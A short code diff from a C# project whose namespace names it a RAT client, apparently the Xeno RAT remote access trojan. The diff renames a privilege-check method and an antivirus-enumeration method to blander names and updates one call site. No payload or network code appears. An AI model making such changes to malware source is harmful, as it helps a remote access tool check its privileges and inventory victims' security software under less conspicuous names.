@@ -85,7 +85,7 @@ namespace xeno_rat_client
             return strTitle;
         }
 
-        public static bool IsAdmin()
+        public static bool IsElevated()
         {
             bool admin = false;
             try
@@ -95,7 +95,7 @@ namespace xeno_rat_client
             catch { }
             return admin;
         }
-        public static string GetAntivirus()
+        public static string GetSecuritySoftware()
         {
             List<string> antivirus = new List<string>();
             try
@@ -189,7 +189,7 @@ namespace xeno_rat_client
         {
             await Task.Run(() =>
             {
-                if (Utils.IsAdmin())
+                if (Utils.IsElevated())
                 {
                     try
                     {
